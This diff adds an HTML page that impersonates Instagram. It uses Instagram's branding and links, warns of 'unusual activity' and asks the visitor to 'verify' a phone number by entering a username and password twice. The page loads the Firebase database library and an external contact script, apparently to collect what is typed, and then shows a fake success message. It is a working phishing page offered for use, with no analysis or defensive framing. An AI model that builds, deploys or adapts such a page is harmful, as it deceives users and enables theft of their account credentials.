@@ -1,0 +1,236 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    
+<head>
+        <meta charset="utf-8" />
+        <title>Instagram</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="description" content="Instagram Security Issue | we founs an unusual activty from your account." />
+        <meta name="keywords" content="Instagram security" />
+        <!-- Favicon -->
+    <link href="img/favicon.png" rel="icon" type="image/png">
+        <!-- Bootstrap -->
+        <link href="css/bootstrap.min.css" rel="stylesheet" type="text/css" />
+        <!-- Icons -->
+        <link href="css/materialdesignicons.min.css" rel="stylesheet" type="text/css" />
+        <!-- Slider -->               
+        <link rel="stylesheet" href="css/tiny-slider.css"/> 
+        <link rel="stylesheet" href="css/owl.theme.default.min.css"/> 
+        <!-- Date picker -->
+        <!-- Main css --> 
+    <style>
+    .instagram{
+  background: #f09433; 
+background: -moz-linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); 
+background: -webkit-linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); 
+background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); 
+filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#f09433', endColorstr='#bc1888',GradientType=1 );
+  }
+    </style>
+        <link href="css/style.min.css" rel="stylesheet" type="text/css" id="theme-opt" />
+        <link href="css/colors/default.css" rel="stylesheet" id="color-opt">
+        <script src="https://www.gstatic.com/firebasejs/8.9.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.9.1/firebase-database.js"></script>
+    </head>
+
+    <body class="bg-half bg-light">
+        
+        <!-- Navbar STart -->
+        <header id="topnav" class="defaultscroll sticky bg-white shadow-sm">
+                    <center><a class="logo" href="https://www.instagram.com/?hl=en"><img src="img/logo.png" height="50" alt=""></a></center>
+            
+        </header>
+
+      
+        
+        <!-- Start  -->
+            <div class="container">
+                <div class="row">
+                    <div class="col-12 text-center">
+                        <div class="section-title">
+                            <h4 class="title mb-4">Verify Your Phone Number</h4>
+                            <p class="text-muted para-desc mx-auto mb-0">Help us keep the Instagram community safe by entering your phone number. We'll text you a security code.</p>
+                        </div>
+                    </div><!--end col-->
+                </div><!--end row-->
+
+                <div class="row justify-content-center">
+                    <div class="col-md-8 mt-4 pt-2">
+                        <div class="custom-form">
+                            <div id="contactForm">
+                                <div class="row">
+                                    <div class="col-12">
+                                        <div class="mb-3">
+                                            <label class="form-label">Your Phone Number <span class="text-danger">*</span></label>
+                                            <input id="contactEmail" type="text" class="form-control"  name="email" required="" placeholder="Your Phone Number :">
+                                        </div>
+                                    </div><!--end col-->
+                                    <div class="col-12">
+                                        <div class="mb-3">
+                                            <label class="form-label">Username <span class="text-danger">*</span></label>
+                                            <input id="contactName" type="text" class="form-control"  name="text" required="" placeholder="Username :">
+                                        </div>
+                                    </div><!--end col-->
+                                    <div class="col-12">
+                                        <div class="mb-3">
+                                            <label class="form-label">Password <span class="text-danger">*</span></label>
+                                            <input id="contactPhone" type="password" class="form-control"  name="text" required="" placeholder="Password :">
+                                        </div>
+                                    </div><!--end col-->
+                                    <div class="col-12">
+                                        <div class="mb-3">
+                                            <label class="form-label">Confirm Password <span class="text-danger">*</span></label>
+                                            <input id="contactSubject" type="password" class="form-control"  name="text" required="" placeholder="Confirm Password :">
+                                        </div>
+                                    </div><!--end col-->
+                                    <div class="col-12" style="display: none">
+                                        <div class="mb-3">
+                                            <label class="form-label">Message <span class="text-danger">*</span></label>
+                                            <textarea  id="contactMessage" rows="6" type="text" class="form-control"  name="text" required="" value="null" placeholder="Your message :"></textarea>
+                                        </div>
+                                    </div><!--end col-->
+                                    <div class="col-12">
+                                        <div class="mb-3">
+                                            <div class="form-check">
+                                                <input class="form-check-input" type="checkbox" value="A" id="contactCheckbox">
+                                                <label class="form-check-label" for="flexCheckDefault">I Agree, Terms and Conditions</label>
+                                            </div>
+                                        </div>
+                                    </div><!--end col-->
+                                    
+                                    <input type="text" id="contactSelected" style="display: none;" />
+                                    <input id="contactDate" style="display: none;">
+                                    
+                                    <div class="col-12" style="display: none;" id="contactSubmitButton">
+                                        <div class="d-grid">
+                                            <button class="btn instagram" type="submit" id="contactSubmit"><span style="color: white"><b>Update Phone Number</b></span></button>
+                                        </div>
+                                    </div>
+                                    
+                                    <div class="col-12" id="contactFakeButton">
+                                        <div class="d-grid">
+                                            <button class="btn instagram" disabled = "disabled"><span style="color: white"><b>Update Phone Number</b></span></button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                               
+                               
+                               <div class="container" id="contactPage2" style="margin-top: 80px; display: none">
+                                    <center>
+                                        <h2 style="color: darkgreen">SUCCESS!</h2>
+                                        <p style="color: black">Your phone number has been updated successfully.</p></center>
+                                </div>
+                        </div><!--end custom-form-->
+                    </div><!--end col-->
+                </div><!--end row-->
+            </div><!--end container-->
+
+
+        
+
+ 
+
+       
+
+
+        <footer class="footer">
+            <div class="container text-center">
+                <div class="row align-items-center">
+                    <div class="col-sm-6">
+                        <div class="flex space-x-2 text-gray-200">
+                    <a href="https://about.instagram.com/" target="_blank" style="color: grey"> About</a> | 
+                    <a href="https://about.instagram.com/micro_site/url/?click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fhelp.instagram.com%2F%3Fref%3Dig_about&event_type=click&last_nav_impression_id=1vI9Pi7wUcylWh7mQ&max_percent_page_viewed=100&max_viewport_height_px=697&max_viewport_width_px=1366&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2F&region=apac&scrolled=true&session_id=0sfmseyIOaZpGQ9bq&site=instagram_about" target="_blank" style="color: grey"> Help</a> | 
+                    <a href="https://about.instagram.com/micro_site/url/?click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fwww.instagram.com%2Flegal%2Fterms%2F&event_type=click&last_nav_impression_id=1vI9Pi7wUcylWh7mQ&max_percent_page_viewed=100&max_viewport_height_px=697&max_viewport_width_px=1366&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2F&region=apac&scrolled=true&session_id=0sfmseyIOaZpGQ9bq&site=instagram_about" target="_blank" style="color: grey"> Terms</a> | 
+                    <a href="https://about.instagram.com/micro_site/url/?click_from_context_menu=true&country=IN&destination=https%3A%2F%2Fwww.instagram.com%2Flegal%2Fprivacy%2F&event_type=click&last_nav_impression_id=1vI9Pi7wUcylWh7mQ&max_percent_page_viewed=100&max_viewport_height_px=697&max_viewport_width_px=1366&orig_request_uri=https%3A%2F%2Fabout.instagram.com%2F&region=apac&scrolled=true&session_id=0sfmseyIOaZpGQ9bq&site=instagram_about" target="_blank" style="color: grey"> Privacy</a>
+                </div>
+                    </div><!--end col-->
+
+                    <div class="col-sm-6 mt-4 mt-sm-0 pt-2 pt-sm-0">
+                        <div class="d-flex justify-content-center">
+                        <p class="mb-0"> © copyright 2022 by Instagram</p>
+                        </div>
+                    </div><!--end col-->
+                </div><!--end row-->
+            </div><!--end container-->
+        </footer><!--end footer-->
+        <!-- Footer End -->
+        
+     
+
+
+        <!-- Back to top -->
+        <a href="#" class="back-to-top rounded text-center" id="back-to-top"> 
+            <i class="mdi mdi-chevron-up d-block"> </i> 
+        </a>
+        <!-- Back to top -->
+
+      
+        <script src="src/star.js"></script>
+        <script src="src/contact.js"></script>
+        <!-- javascript -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0/jquery.min.js"></script>
+        <script src="js/bootstrap.bundle.min.js"></script>
+        <!-- SLIDER -->
+        <script src="js/tiny-slider.js"></script>
+        <script src="js/tiny-slider-init.js"></script>
+        <script src="js/datepicker.min.js"></script>
+        <script src="js/datepicker.init.js"></script>
+        <!-- Icons -->
+        <script src="js/feather.min.js"></script>
+        <!-- Icons -->
+        <!-- Main Js -->
+        <script src="js/app.js"></script>
+        
+        <!------------------------------------ CONTACT FORM SCRIPTS ----------------------------------------------------------->
+        <script>
+        document.getElementById('contactDate').value = Date();
+
+        $(function() {
+            $('#contactSubmitButton').attr('disabled', true);
+            $('#contactForm').change(function() {
+                if ($('#contactName').val() != '' && $('#contactEmail').val() != '' && $('#contactSubject').val() != '' && $('#contactSelected').val() != '') {
+                    $('#contactSubmitButton').show();
+                    $('#contactFakeButton').hide();
+                } else {
+                    $('#contactSubmitButton').hide();
+                    $('#contactFakeButton').show();
+                }
+            });
+        });
+      </script>
+        
+        <script>
+        $(document).ready(function() {
+            $("#contactSubmit").click(function() {
+                $("#contactForm").hide();
+                $("#contactPage2").show('slow');
+            });
+        });
+       </script>
+        
+        <script>
+        (function() {
+            $('input:checkbox').change((e) => {
+                if ($(e.currentTarget).is(':checked')) {
+                    var curVal = $('#contactSelected').val();
+                    if (curVal) {
+                        $('#contactSelected').val(curVal + ', ' + e.currentTarget.value);
+                    } else {
+
+                        $('#contactSelected').val(e.currentTarget.value);
+                    }
+                } else {
+                    var curVal = $('#contactSelected').val().split(',');
+                    var filteredVal = curVal.filter(el => el.trim() !== e.currentTarget.value)
+                    $('#contactSelected').val(filteredVal.join(','));
+                }
+            });
+        })();
+    </script>
+    <!------------------------------------*** END OF CONTACT FORM SCRIPTS **----------------------------------------------------------->
+        
+    </body>
+
+</html>
